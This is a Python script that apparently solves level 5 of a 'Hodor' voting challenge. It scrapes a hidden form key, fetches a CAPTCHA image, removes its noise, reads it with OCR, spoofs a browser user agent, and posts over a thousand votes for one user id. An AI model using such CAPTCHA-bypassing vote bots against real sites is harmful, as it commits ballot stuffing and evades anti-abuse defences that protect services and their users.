#!/usr/bin/python3
'''
Module for Hodor level 5 challenge.

Has to have a WINDOW's user agent.

Has to use pytesseract to read a CAPTCHA image off the server.

Has to first remove black static obfuscation by changing all
black pixels to the background grey to allow the OCR a better
probability of reading the text correctly.

Has to parse the hidden 'key' field's 'value' from a GET request

Has to add the user's 'id' and 'holdthedoor' fields to POST request.

'''
import requests
import re
import time
import pytesseract
from PIL import Image


def deobfuscate(img_file, limit=10):
    '''Method to change black pixels to the background grey.'''
    img = Image.open(img_file)
    img = img.convert('RGB')
    pixel_data = img.load()

    for x in range(img.size[0]):
        for y in range(img.size[1]):
            if (pixel_data[x, y][0] < limit) \
                    and (pixel_data[x, y][1] < limit) \
                    and (pixel_data[x, y][2] < limit):
                pixel_data[x, y] = (0x80, 0x80, 0x80, 255)

    img.show()
    img.save('deobfuscated.png')

url = 'http://158.69.76.135/level5.php'
captcha_url = 'http://158.69.76.135/tim.php'
data = {'id': '650', 'holdthedoor': 'Submit'}
referer = url
agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
(KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
headers = {'User-Agent': agent, 'Referer': url}
success = "Hold the Door challenge - Tim Britton's special"
votes = 1024
ok = 0
fail = 0
s = requests.Session()
s.headers.update(headers)

while ok < votes and fail < 100:
    try:
        response = s.get(url, headers=headers)
        if response.status_code is not 200:
            continue
        matches = re.findall("value=\"([^\"]+)\"",
                             response.text)
        if not len(matches):
            continue

        data["key"] = matches[0]

        response = s.get(captcha_url, headers=headers)
        f = open('captcha.png', 'wb')
        f.write(response.content)
        f.close()
        deobfuscate("captcha.png")
        data["captcha"] = \
            pytesseract.image_to_string(Image.open('deobfuscated.png'))

        # print(data)
        response = s.post(url, data=data)
        # print(response.text)
        if response.status_code is 200 and success in response.text:
            fail = 0
            ok += 1
            print("{} ok!".format(ok))
    except Exception as e:
        print(e)
        fail += 1

print("Finished: {}/{} votes.".format(ok, votes))
